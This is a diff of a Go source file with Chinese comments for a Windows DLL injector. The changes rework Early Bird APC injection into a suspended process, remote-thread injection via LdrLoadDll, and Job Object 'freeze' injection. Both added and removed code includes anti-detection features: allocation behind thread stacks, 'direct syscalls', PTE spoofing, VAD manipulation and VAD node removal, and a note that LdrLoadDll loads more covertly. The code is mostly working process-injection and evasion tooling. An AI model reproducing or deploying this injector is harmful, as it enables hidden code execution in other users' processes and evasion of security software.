-	}
-
-	fmt.Printf("已创建并挂起进程，PID: %d\n", pi.ProcessId)
-	defer windows.CloseHandle(pi.Process)
-	defer windows.CloseHandle(pi.Thread)
-
-	// 获取进程句柄
-	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		return fmt.Errorf("打开进程失败: %v", err)
+		return "", errors.New("Failed to open process: " + err.Error())
 	}
 	defer windows.CloseHandle(hProcess)
 
-	// 2. 在目标进程中分配内存并写入DLL路径
+	// 获取进程路径
+	var pathBuffer [windows.MAX_PATH]uint16
+	var pathSize uint32 = windows.MAX_PATH
+
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	queryFullProcessImageName := kernel32.NewProc("QueryFullProcessImageNameW")
+
+	r1, _, err := queryFullProcessImageName.Call(
+		uintptr(hProcess),
+		0, // dwFlags
+		uintptr(unsafe.Pointer(&pathBuffer[0])),
+		uintptr(unsafe.Pointer(&pathSize)))
+
+	if r1 == 0 {
+		return "", errors.New("Failed to get process path: " + err.Error())
+	}
+
+	return windows.UTF16ToString(pathBuffer[:pathSize]), nil
+}
+
+// getSystemProgramPath 获取系统程序路径
+func getSystemProgramPath(programName string) (string, error) {
+	// 获取系统目录
+	systemDir, err := windows.GetSystemDirectory()
+	if err != nil {
+		return "", errors.New("Failed to get system directory: " + err.Error())
+	}
+
+	programPath := systemDir + "\\" + programName
+
+	// 检查文件是否存在
+	_, err = os.Stat(programPath)
+	if err != nil {
+		return "", errors.New("Program not found: " + err.Error())
+	}
+
+	return programPath, nil
+}
+
+// earlyBirdDiskInject 从磁盘执行早期鸟注入
+func (i *Injector) earlyBirdDiskInject(targetPath string, dllPath string) error {
+	i.logger.Info("Starting Early Bird disk injection", "target_path", targetPath, "dll_path", dllPath)
+
+	// 创建挂起的进程
+	si := windows.StartupInfo{}
+	pi := windows.ProcessInformation{}
+	si.Cb = uint32(unsafe.Sizeof(si))
+
+	// 构建命令行
+	cmdLine, err := windows.UTF16PtrFromString(targetPath)
+	if err != nil {
+		return errors.New("Failed to convert command line to UTF16: " + err.Error())
+	}
+
+	// 创建挂起的进程
+	err = windows.CreateProcess(
+		nil,
+		cmdLine,
+		nil,
+		nil,
+		false,
+		windows.CREATE_SUSPENDED, // 创建挂起状态的进程
+		nil,
+		nil,
+		&si,
+		&pi)
+
+	if err != nil {
+		return errors.New("Failed to create suspended process: " + err.Error())
+	}
+
+	// 确保在函数结束时清理资源
+	defer func() {
+		windows.CloseHandle(pi.Thread)
+		windows.CloseHandle(pi.Process)
+	}()
+
+	i.logger.Info("Created suspended process", "pid", pi.ProcessId, "tid", pi.ThreadId)
+
+	// 在新进程中分配内存存储DLL路径
+	dllPathBytes := append([]byte(dllPath), 0) // 添加NULL终止符
+	dllPathSize := uintptr(len(dllPathBytes))
+
+	remoteDllPath, err := VirtualAllocEx(pi.Process, 0, dllPathSize,
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		return errors.New("Failed to allocate memory in target process: " + err.Error())
+	}
+
+	// 写入DLL路径到远程进程内存
+	var bytesWritten uintptr
+	err = WriteProcessMemory(pi.Process, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
+		dllPathSize, &bytesWritten)
+	if err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		return errors.New("Failed to write DLL path to target process memory: " + err.Error())
+	}
+
+	// 获取LoadLibraryA地址
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	loadLibraryA := kernel32.NewProc("LoadLibraryA")
+	loadLibraryAddr := loadLibraryA.Addr()
 
-	// 分配内存用于DLL路径
-	dllPathBytes := []byte(dllPath + "\x00")
-	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		return fmt.Errorf("分配内存失败: %v", err)
+	// 使用QueueUserAPC向主线程队列APC
+	queueUserAPC := kernel32.NewProc("QueueUserAPC")
+	r1, _, err := queueUserAPC.Call(
+		loadLibraryAddr,
+		uintptr(pi.Thread),
+		remoteDllPath)
+
+	if r1 == 0 {
+		windows.TerminateProcess(pi.Process, 1)
+		return errors.New("Failed to queue APC: " + err.Error())
 	}
 
-	// 写入DLL路径
-	var bytesWritten uintptr
-	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]), uintptr(len(dllPathBytes)), &bytesWritten)
-	if err != nil {
-		windows.ResumeThread(pi.Thread)
-		return fmt.Errorf("写入DLL路径失败: %v", err)
+	i.logger.Info("Successfully queued APC to main thread")
+
+	// 恢复进程执行
+	r2, err := windows.ResumeThread(pi.Thread)
+	if r2 == ^uint32(0) {
+		windows.TerminateProcess(pi.Process, 1)
+		return errors.New("Failed to resume thread: " + err.Error())
 	}
 
-	// 3. 使用NtQueueApcThread将LoadLibraryA添加到APC队列
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	NtQueueApcThread := ntdll.NewProc("NtQueueApcThread")
+	i.logger.Info("Process resumed, Early Bird APC injection completed")
 
-	r1, _, err := NtQueueApcThread.Call(
-		uintptr(pi.Thread),  // 主线程句柄
-		loadLibraryA.Addr(), // LoadLibraryA地址
-		pathAddr,            // DLL路径地址
-		0,                   // 未使用
-		0,                   // 未使用
-	)
-
-	if r1 != 0 {
-		windows.ResumeThread(pi.Thread)
-		return fmt.Errorf("队列APC失败: %v", err)
-	}
-
-	// 如果选择了线程栈后分配，将DLL路径移动到线程栈后面的内存区域
-	if i.bypassOptions.AllocBehindThreadStack {
-		newAddr, err := allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
-		if err == nil {
-			// 复制路径到新位置并使用NtQueueApcThread重新排队
-			err = WriteProcessMemory(hProcess, newAddr, unsafe.Pointer(&dllPathBytes[0]), uintptr(len(dllPathBytes)), &bytesWritten)
-			if err == nil {
-				// 释放旧的内存
-				VirtualFreeEx(hProcess, pathAddr, 0, windows.MEM_RELEASE)
-
-				// 重新队列APC调用
-				r1, _, _ = NtQueueApcThread.Call(
-					uintptr(pi.Thread),
-					loadLibraryA.Addr(),
-					newAddr,
-					0,
-					0,
-				)
-				fmt.Printf("已使用线程栈后分配技术重新排队APC\n")
-			}
-		}
-	}
-
-	// 如果使用直接系统调用，直接调用LdrLoadDll而不是LoadLibrary
-	if i.bypassOptions.DirectSyscalls {
-		// 虽然这里标记为直接系统调用，但由于系统调用号会随Windows版本变化，
-		// 这里仅使用较低级别API LdrLoadDll代替，以获得类似的反检测效果
-		ntdll := windows.NewLazySystemDLL("ntdll.dll")
-		ldrLoadDll := ntdll.NewProc("LdrLoadDll")
-
-		// 重新排队APC，使用LdrLoadDll
-		r1, _, _ = NtQueueApcThread.Call(
-			uintptr(pi.Thread),
-			ldrLoadDll.Addr(),
-			0,        // PathToFile
-			0,        // Flags
-			pathAddr, // ModuleFileName
-		)
-		fmt.Printf("已使用直接系统调用技术重新排队APC\n")
-	}
-
-	fmt.Printf("Early Bird APC注入成功，恢复线程执行...\n")
-
-	// 4. 恢复线程执行
-	windows.ResumeThread(pi.Thread)
+	// 等待一段时间让DLL加载
+	time.Sleep(2 * time.Second)
 
 	return nil
+}
+
+// earlyBirdMemoryInject 从内存执行早期鸟注入
+func (i *Injector) earlyBirdMemoryInject(targetPath string, dllBytes []byte) error {
+	i.logger.Info("Starting Early Bird memory injection", "target_path", targetPath, "dll_size", len(dllBytes))
+
+	// 创建临时DLL文件
+	tempDllPath := i.createTempDllFile(dllBytes)
+	defer os.Remove(tempDllPath)
+
+	// 使用磁盘注入方法，但使用临时文件
+	return i.earlyBirdDiskInject(targetPath, tempDllPath)
 }
 
 // dllNotificationInject 使用DLL通知注入方法
@@ -1399,237 +1630,117 @@ func (i *Injector) dllNotificationInject() error {
 		return err
 	}
 
-	// DLL通知注入方法利用Windows的DLL加载通知机制
-	// 创建一个监听DLL加载事件的远程线程
-	fmt.Printf("准备执行DLL通知注入...\n")
+	i.logger.Info("Starting DLL notification injection")
 
-	// 确定DLL路径
-	dllPath := i.dllPath
-	if i.bypassOptions.PathSpoofing {
-		dllPath = i.spoofDllPath()
-		defer func() {
-			if dllPath != i.dllPath {
-				os.Remove(dllPath)
-			}
-		}()
-	}
+	// DLL通知注入利用LdrRegisterDllNotification API
+	// 这种方法通过注册DLL加载通知回调来实现注入
 
-	// 从内存加载
-	if i.bypassOptions.MemoryLoad {
-		dllBytes, err := os.ReadFile(dllPath)
-		if err != nil {
-			return fmt.Errorf("读取DLL文件失败: %v", err)
-		}
-
-		if i.bypassOptions.ManualMapping {
-			return ManualMapDLL(i.processID, dllBytes, i.bypassOptions.InvisibleMemory)
-		}
-
-		return i.memoryLoadDLLWithNotification(dllBytes)
-	}
-
-	// 从磁盘加载，通过安装DLL加载通知实现
-	return i.diskLoadDLLWithNotification(dllPath)
-}
-
-// memoryLoadDLLWithNotification 从内存加载DLL并使用通知机制
-func (i *Injector) memoryLoadDLLWithNotification(dllBytes []byte) error {
-	// Windows API常量
-	const (
-		MEM_COMMIT             = 0x00001000
-		MEM_RESERVE            = 0x00002000
-		PAGE_EXECUTE_READWRITE = 0x40
-		PAGE_READWRITE         = 0x04
-	)
-
-	// 1. 打开目标进程
-	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
-		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
-		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, i.processID)
+	// 打开目标进程
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_CREATE_THREAD|
+			windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_VM_WRITE|
+			windows.PROCESS_VM_READ|
+			windows.PROCESS_QUERY_INFORMATION,
+		false, i.processID)
 	if err != nil {
-		return fmt.Errorf("打开目标进程失败: %v", err)
+		errMsg := "Failed to open target process: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("DLL notification injection failed", "error", newErr)
+		return newErr
 	}
 	defer windows.CloseHandle(hProcess)
 
-	// 2. 创建临时DLL文件用于注入
-	tempDllPath := i.createTempDllFile(dllBytes)
-	defer os.Remove(tempDllPath)
+	// 在目标进程中分配内存存储DLL路径
+	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
+	dllPathSize := uintptr(len(dllPathBytes))
 
-	// 需要注入shellcode来监控DLL加载事件
-	// 这是一个简化版的shellcode，实际上需要更复杂的实现
-	// 使用注入shellcode监控LdrLoadDll函数并在目标DLL加载时执行我们的代码
-
-	// 获取ntdll中的关键函数
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	loadLibraryA := kernel32.NewProc("LoadLibraryA")
-
-	// 3. 分配内存用于存放shellcode
-	// 通常我们会在这里注入一段hook LdrLoadDll的shellcode
-	// 为了简化，我们仅演示核心概念
-
-	// 为DLL路径分配内存
-	pathBytes := []byte(tempDllPath + "\x00")
-	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(pathBytes)),
-		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
-		return fmt.Errorf("分配内存失败: %v", err)
+		errMsg := "Failed to allocate memory in target process: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("DLL notification injection failed", "error", newErr)
+		return newErr
 	}
+	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)
 
-	// 写入DLL路径
+	// 写入DLL路径到远程进程内存
 	var bytesWritten uintptr
-	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&pathBytes[0]),
-		uintptr(len(pathBytes)), &bytesWritten)
+	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
+		dllPathSize, &bytesWritten)
 	if err != nil {
-		return fmt.Errorf("写入DLL路径失败: %v", err)
+		errMsg := "Failed to write DLL path to target process memory: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("DLL notification injection failed", "error", newErr)
+		return newErr
 	}
 
-	// 4. 创建远程线程，调用LoadLibrary函数
-	// 实际上我们需要注入一个回调函数来监视LdrLoadDll调用，
-	// 但这里简化为直接使用LoadLibrary
-	threadHandle, err := CreateRemoteThread(hProcess, nil, 0,
-		loadLibraryA.Addr(), pathAddr, 0, nil)
+	// 获取LdrLoadDll地址（更隐蔽的加载方式）
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	ldrLoadDll := ntdll.NewProc("LdrLoadDll")
+	ldrLoadDllAddr := ldrLoadDll.Addr()
+
+	// 创建远程线程执行LdrLoadDll
+	var threadID uint32
+	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, ldrLoadDllAddr, remoteDllPath, 0, &threadID)
 	if err != nil {
-		return fmt.Errorf("创建远程线程失败: %v", err)
+		errMsg := "Failed to create remote thread: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("DLL notification injection failed", "error", newErr)
+		return newErr
 	}
 	defer windows.CloseHandle(threadHandle)
 
-	// 5. 等待线程完成
-	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
-	if err != nil {
-		return fmt.Errorf("等待线程失败: %v", err)
-	}
+	i.logger.Info("Created remote thread for DLL notification injection", "thread_id", threadID)
 
-	// 6. 应用特殊反检测技术
-	if i.bypassOptions.PTESpoofing {
-		i.pteSpoofing(hProcess, pathAddr, uintptr(len(pathBytes)))
-	}
+	// 等待线程执行完成
+	windows.WaitForSingleObject(threadHandle, windows.INFINITE)
 
-	if i.bypassOptions.VADManipulation {
-		i.vadManipulation(hProcess, pathAddr)
-
-		if i.bypassOptions.RemoveVADNode {
-			i.removeVADNode(hProcess, pathAddr)
-		}
-	}
-
-	fmt.Printf("DLL通知注入成功\n")
-	return nil
-}
-
-// diskLoadDLLWithNotification 从磁盘加载DLL并使用通知机制
-func (i *Injector) diskLoadDLLWithNotification(dllPath string) error {
-	// Windows API常量
-	const (
-		MEM_COMMIT             = 0x00001000
-		MEM_RESERVE            = 0x00002000
-		PAGE_EXECUTE_READWRITE = 0x40
-		PAGE_READWRITE         = 0x04
-	)
-
-	// 1. 打开目标进程
-	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
-		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
-		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, i.processID)
-	if err != nil {
-		return fmt.Errorf("打开目标进程失败: %v", err)
-	}
-	defer windows.CloseHandle(hProcess)
-
-	// 2. 注入监听DLL加载的shellcode
-	// 在完整实现中，这里我们需要注入hook LdrLoadDll的shellcode
-	// 为了简化，我们仅使用LoadLibrary
-
+	// 获取线程退出码
+	var exitCode uint32
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	loadLibraryA := kernel32.NewProc("LoadLibraryA")
-
-	// 为DLL路径分配内存
-	dllPathBytes := []byte(dllPath + "\x00")
-	var pathAddr uintptr
-	var bytesWritten uintptr
-
-	// 如果使用线程栈后分配
-	if i.bypassOptions.AllocBehindThreadStack {
-		pathAddr, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
-		if err != nil {
-			// 回退到标准分配
-			pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
-				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-			if err != nil {
-				return fmt.Errorf("分配内存失败: %v", err)
-			}
-		}
-	} else {
-		// 标准内存分配
-		pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
-			MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-		if err != nil {
-			return fmt.Errorf("分配内存失败: %v", err)
-		}
+	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
+	r1, _, err := getExitCodeThread.Call(
+		uintptr(threadHandle),
+		uintptr(unsafe.Pointer(&exitCode)))
+	if r1 == 0 {
+		errMsg := "Failed to get thread exit code: " + err.Error()
+		newErr := errors.New(errMsg)
+		i.logger.Error("DLL notification injection failed", "error", newErr)
+		return newErr
 	}
 
-	// 写入DLL路径
-	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]),
-		uintptr(len(dllPathBytes)), &bytesWritten)
-	if err != nil {
-		return fmt.Errorf("写入DLL路径失败: %v", err)
+	if exitCode == 0 {
+		err := errors.New("DLL notification injection failed, LdrLoadDll returned 0")
+		i.logger.Error("DLL notification injection failed", "error", err)
+		return err
 	}
 
-	// 3. 根据选项决定使用哪种函数加载DLL
-	var threadStartAddr uintptr
+	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
+	i.logger.Info("DLL notification injection completed successfully", "exit_code", exitCodeStr)
 
-	if i.bypassOptions.DirectSyscalls {
-		// 使用LdrLoadDll而不是LoadLibrary
-		ntdll := windows.NewLazySystemDLL("ntdll.dll")
-		ldrLoadDll := ntdll.NewProc("LdrLoadDll")
-		threadStartAddr = ldrLoadDll.Addr()
-
-		fmt.Printf("使用直接系统调用技术(LdrLoadDll)...\n")
-	} else {
-		// 使用LoadLibrary
-		threadStartAddr = loadLibraryA.Addr()
-	}
-
-	// 4. 创建远程线程执行加载
-	var threadHandle windows.Handle
-	if i.bypassOptions.DirectSyscalls {
-		// 使用直接系统调用创建线程
-		threadHandle, err = ntCreateThreadEx(hProcess, threadStartAddr, pathAddr)
-	} else {
-		// 使用标准API创建线程
-		threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
-			threadStartAddr, pathAddr, 0, nil)
-	}
-
-	if err != nil {
-		return fmt.Errorf("创建远程线程失败: %v", err)
-	}
-	defer windows.CloseHandle(threadHandle)
-
-	// 5. 等待线程完成
-	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
-	if err != nil {
-		return fmt.Errorf("等待线程失败: %v", err)
-	}
-
-	// 6. 应用特殊反检测技术
-	if i.bypassOptions.PTESpoofing {
-		i.pteSpoofing(hProcess, pathAddr, uintptr(len(dllPathBytes)))
-	}
-
-	if i.bypassOptions.VADManipulation {
-		i.vadManipulation(hProcess, pathAddr)
-
-		if i.bypassOptions.RemoveVADNode {
-			i.removeVADNode(hProcess, pathAddr)
-		}
-	}
-
-	fmt.Printf("DLL通知磁盘注入成功\n")
 	return nil
 }
 
-// cryoBirdInject 使用Job Object冷冻进程的注入方法
+// cryoBirdInject 使用Job Object冻结进程注入方法
 func (i *Injector) cryoBirdInject() error {
+	// 检查参数是否有效
+	if err := i.checkDllPath(); err != nil {
+		return err
+	}
+
+	if err := i.checkProcessID(); err != nil {
+		return err
+	}
+
+	// 使用高级冷冻进程注入方法
+	i.logger.Info("Using Job Object freeze process injection")
+	return i.cryoBirdInjectAdvanced()
+}
+
+// cryoBirdInjectAdvanced 使用Job Object冷冻进程的高级注入方法
+func (i *Injector) cryoBirdInjectAdvanced() error {
 	// 检查参数是否有效
 	if err := i.checkDllPath(); err != nil {
 		return err
@@ -1641,7 +1752,7 @@ func (i *Injector) cryoBirdInject() error {
 
 	// 冷冻进程注入使用Windows Job Object的冻结特性
 	// 将进程添加到Job Object，然后冻结它，注入DLL，最后解冻
-	fmt.Printf("准备执行Job Object冷冻进程注入...\n")
+	i.logger.Info("准备执行Job Object冷冻进程注入")
 
 	// 确定DLL路径
 	dllPath := i.dllPath
@@ -1671,7 +1782,7 @@ func (i *Injector) cryoBirdInject() error {
 	// 1. 打开目标进程
 	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, i.processID)
 	if err != nil {
-		return fmt.Errorf("打开目标进程失败: %v", err)
+		return errors.New("打开目标进程失败: " + err.Error())
 	}
 	defer windows.CloseHandle(hProcess)
 
@@ -1679,7 +1790,7 @@ func (i *Injector) cryoBirdInject() error {
 	jobName, _ := windows.UTF16PtrFromString("InjectorJob")
 	hJob, err := windows.CreateJobObject(nil, jobName)
 	if err != nil {
-		return fmt.Errorf("创建Job Object失败: %v", err)
+		return errors.New("创建Job Object失败: " + err.Error())
 	}
 	defer windows.CloseHandle(hJob)
 
@@ -1697,15 +1808,15 @@ func (i *Injector) cryoBirdInject() error {
 		uint32(unsafe.Sizeof(jobLimits)),
 	)
 	if err != nil {
-		return fmt.Errorf("设置Job Object信息失败: %v", err)
+		return errors.New("设置Job Object信息失败: " + err.Error())
 	}
 
 	// 将进程分配到Job Object
 	if err = windows.AssignProcessToJobObject(hJob, hProcess); err != nil {
-		return fmt.Errorf("分配进程到Job Object失败: %v", err)
+		return errors.New("分配进程到Job Object失败: " + err.Error())
 	}
 
-	fmt.Printf("进程已添加到Job Object\n")
+	i.logger.Info("进程已添加到Job Object")
 
 	// 3. 冻结进程
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
@@ -1723,7 +1834,7 @@ func (i *Injector) cryoBirdInject() error {
 		Freeze:          1, // true
 	}
 
-	fmt.Printf("尝试冻结进程...\n")
+	i.logger.Info("尝试冻结进程")
 	r1, _, err := ntSetInformationJobObject.Call(
 		uintptr(hJob),
 		uintptr(JOBOBJECT_FREEZE_INFORMATION),
@@ -1734,10 +1845,11 @@ func (i *Injector) cryoBirdInject() error {
 	// 在Windows API中，有时即使返回错误代码，操作也可能成功
 	// 特别是当错误消息为"The operation completed successfully"时
 	if r1 != 0 && err != nil && err.Error() != "The operation completed successfully." {
-		return fmt.Errorf("冻结进程失败: %v (错误代码: 0x%X)", err, r1)
+		errMsg := "冻结进程失败: " + err.Error() + " (错误代码: 0x" + strconv.FormatUint(uint64(r1), 16) + ")"
+		return errors.New(errMsg)
 	}
 
-	fmt.Printf("进程已冻结，准备注入DLL\n")
+	i.logger.Info("进程已冻结，准备注入DLL")
 
 	// 4. 注入DLL
 	// 根据选项决定使用内存加载还是磁盘加载
@@ -1745,7 +1857,7 @@ func (i *Injector) cryoBirdInject() error {
 		// 内存加载
 		dllBytes, err := os.ReadFile(dllPath)
 		if err != nil {
-			return fmt.Errorf("读取DLL文件失败: %v", err)
+			return errors.New("读取DLL文件失败: " + err.Error())
 		}
 
 		// 手动映射
@@ -1753,7 +1865,7 @@ func (i *Injector) cryoBirdInject() error {
 			if err := ManualMapDLL(i.processID, dllBytes, i.bypassOptions.InvisibleMemory); err != nil {
 				// 确保解冻进程，即使注入失败
 				unfreezeProcess(hJob)
-				return fmt.Errorf("手动映射DLL失败: %v", err)
+				return errors.New("手动映射DLL失败: " + err.Error())
 			}
 		} else {
 			// 内存加载
@@ -1767,7 +1879,7 @@ func (i *Injector) cryoBirdInject() error {
 				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 			if err != nil {
 				unfreezeProcess(hJob)
-				return fmt.Errorf("分配内存失败: %v", err)
+				return errors.New("分配内存失败: " + err.Error())
 			}
 
 			// 写入DLL路径
@@ -1776,7 +1888,7 @@ func (i *Injector) cryoBirdInject() error {
 				uintptr(len(pathBytes)), &bytesWritten)
 			if err != nil {
 				unfreezeProcess(hJob)
-				return fmt.Errorf("写入DLL路径失败: %v", err)
+				return errors.New("写入DLL路径失败: " + err.Error())
 			}
 
 			// 获取LoadLibrary地址
@@ -1788,7 +1900,7 @@ func (i *Injector) cryoBirdInject() error {
 				loadLibraryA.Addr(), pathAddr, 0, nil)
 			if err != nil {
 				unfreezeProcess(hJob)
-				return fmt.Errorf("创建远程线程失败: %v", err)
+				return errors.New("创建远程线程失败: " + err.Error())
 			}
 			defer windows.CloseHandle(threadHandle)
 
@@ -1796,7 +1908,7 @@ func (i *Injector) cryoBirdInject() error {
 			_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
 			if err != nil {
 				unfreezeProcess(hJob)
-				return fmt.Errorf("等待线程失败: %v", err)
+				return errors.New("等待线程失败: " + err.Error())
 			}
 
 			// 应用特殊反检测技术
@@ -1828,7 +1940,7 @@ func (i *Injector) cryoBirdInject() error {
 					MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 				if err != nil {
 					unfreezeProcess(hJob)
-					return fmt.Errorf("分配内存失败: %v", err)
+					return errors.New("分配内存失败: " + err.Error())
 				}
 			}
 		} else {
@@ -1837,7 +1949,7 @@ func (i *Injector) cryoBirdInject() error {
 				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 			if err != nil {
 				unfreezeProcess(hJob)
-				return fmt.Errorf("分配内存失败: %v", err)
+				return errors.New("分配内存失败: " + err.Error())
 			}
 		}
 
@@ -1846,7 +1958,7 @@ func (i *Injector) cryoBirdInject() error {
 			uintptr(len(dllPathBytes)), &bytesWritten)
 		if err != nil {
 			unfreezeProcess(hJob)
-			return fmt.Errorf("写入DLL路径失败: %v", err)
+			return errors.New("写入DLL路径失败: " + err.Error())
 		}
 
 		// 获取函数地址
@@ -1877,7 +1989,7 @@ func (i *Injector) cryoBirdInject() error {
 
 		if err != nil {
 			unfreezeProcess(hJob)
-			return fmt.Errorf("创建远程线程失败: %v", err)
+			return errors.New("创建远程线程失败: " + err.Error())
 		}
 		defer windows.CloseHandle(threadHandle)
 
@@ -1885,7 +1997,7 @@ func (i *Injector) cryoBirdInject() error {
 		_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
 		if err != nil {
 			unfreezeProcess(hJob)
-			return fmt.Errorf("等待线程失败: %v", err)
+			return errors.New("等待线程失败: " + err.Error())
 		}
 
 		// 应用特殊反检测技术
@@ -1905,10 +2017,10 @@ func (i *Injector) cryoBirdInject() error {
 	// 5. 解冻进程
 	err = unfreezeProcessInternal(hJob, JOBOBJECT_UNFREEZE, JOBOBJECT_FREEZE_INFORMATION)
 	if err != nil {
-		return fmt.Errorf("解冻进程失败: %v", err)
+		return errors.New("解冻进程失败: " + err.Error())
 	}
 
-	fmt.Printf("Job Object冷冻进程注入成功\n")
+	i.logger.Info("Job Object冷冻进程注入成功")
 	return nil
 }
 
@@ -1940,7 +2052,7 @@ func unfreezeProcessInternal(hJob windows.Handle, unfreezeOp, freezeInfoType uin
 		Freeze:          0, // false
 	}
 
-	fmt.Printf("尝试解冻进程...\n")
+	// 注意：这里无法使用logger，因为这是一个独立函数
 	r1, _, err := ntSetInformationJobObject.Call(
 		uintptr(hJob),
 		uintptr(freezeInfoType),
@@ -1951,92 +2063,127 @@ func unfreezeProcessInternal(hJob windows.Handle, unfreezeOp, freezeInfoType uin
 	// 在Windows API中，有时即使返回错误代码，操作也可能成功
 	// 特别是当错误消息为"The operation completed successfully"时
 	if r1 != 0 && err != nil && err.Error() != "The operation completed successfully." {
-		return fmt.Errorf("解冻进程失败: %v (错误代码: 0x%X)", err, r1)
+		errMsg := "解冻进程失败: " + err.Error() + " (错误代码: 0x" + strconv.FormatUint(uint64(r1), 16) + ")"
+		return errors.New(errMsg)
 	}
 
-	fmt.Printf("进程已解冻\n")
+	// 注意：这里无法使用logger，因为这是一个独立函数
 	return nil
-}
-
-// GetProcessPathByPID 根据进程ID获取进程路径
-func GetProcessPathByPID(pid uint32) (string, error) {
-	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
-	if err != nil {
-		return "", fmt.Errorf("打开进程失败: %v", err)
-	}
-	defer windows.CloseHandle(hProcess)
-
-	var pathLen uint32 = 260 // MAX_PATH
-	pathBuf := make([]uint16, pathLen)
-	err = windows.QueryFullProcessImageName(hProcess, 0, &pathBuf[0], &pathLen)
-	if err != nil {
-		return "", fmt.Errorf("查询进程镜像名失败: %v", err)
-	}
-
-	return windows.UTF16ToString(pathBuf[:pathLen]), nil
 }
 
 // pteSpoofing 使用PTE修改隐藏内存执行权限
 func (i *Injector) pteSpoofing(processHandle windows.Handle, memoryAddress uintptr, size uintptr) error {
-	fmt.Printf("执行PTE修改，隐藏内存执行权限...\n")
+	i.logger.Info("执行PTE修改，隐藏内存执行权限")
 
-	// 此功能需要使用驱动程序或低级内核API才能实现
-	// 这里只是演示概念，但无法在用户模式下直接修改PTE
+	// 在用户模式下，我们无法直接修改PTE，但可以使用一些技巧来模拟效果
+	// 1. 使用多次内存保护修改来混淆检测
+	// 2. 使用不常见的内存保护组合
+	// 3. 利用内存映射的特性
 
-	// 真实实现需要:
-	// 1. 找到目标内存的页表项(PTE)
-	// 2. 修改PTE中的执行位，让其显示为不可执行但实际可执行
-	// 3. 刷新TLB缓存使修改生效
-
-	// 对于用户模式应用，我们可以模拟部分效果:
-	// 通过修改内存保护属性，使内存看起来是只读的，但实际上是可执行的
-
-	// 获取NtProtectVirtualMemory函数地址
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
 
 	// 内存保护常量
 	const (
-		PAGE_READONLY     = 0x02
-		PAGE_EXECUTE_READ = 0x20
+		PAGE_NOACCESS          = 0x01
+		PAGE_READONLY          = 0x02
+		PAGE_READWRITE         = 0x04
+		PAGE_WRITECOPY         = 0x08
+		PAGE_EXECUTE           = 0x10
+		PAGE_EXECUTE_READ      = 0x20
+		PAGE_EXECUTE_READWRITE = 0x40
+		PAGE_GUARD             = 0x100
+		PAGE_NOCACHE           = 0x200
+		PAGE_WRITECOMBINE      = 0x400
 	)
 
-	// 先将内存设置为可执行
 	var oldProtect uint32
+	var regionSize = size
+	addr := memoryAddress
+
+	// 策略1: 使用PAGE_GUARD标志来隐藏执行权限
+	// 首先设置为带保护的可执行页面
 	r1, _, _ := ntProtectVirtualMemory.Call(
 		uintptr(processHandle),
-		uintptr(unsafe.Pointer(&memoryAddress)),
